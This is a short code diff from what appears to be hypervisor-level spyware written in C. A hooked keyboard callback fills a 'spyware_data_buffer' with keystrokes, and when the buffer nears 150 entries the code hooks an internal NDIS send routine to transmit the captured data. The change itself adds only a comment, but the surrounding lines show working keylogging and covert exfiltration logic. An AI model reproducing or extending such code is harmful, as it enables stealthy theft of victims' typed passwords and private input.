@@ -72,10 +72,12 @@ __attribute__((section(".vmm"))) void handle_KeyboardClassServiceCallback_hook(v
                 }
             }
 
+            // Send if buffer is almost full
             if (shared_cores_data.spyware_data_buffer.length >= 150){
                 shared_cores_data.send_pending = TRUE;
                 hook_function(guest_virtual_to_physical(shared_cores_data.ndis + NDIS_ndisMSendNBLToMiniportInternal_OFFSET));
             } 
+            
             ReleaseLock(&shared_cores_data.spyware_data_lock);
         }
         else if (data_phys->Flags == KEY_BREAK)
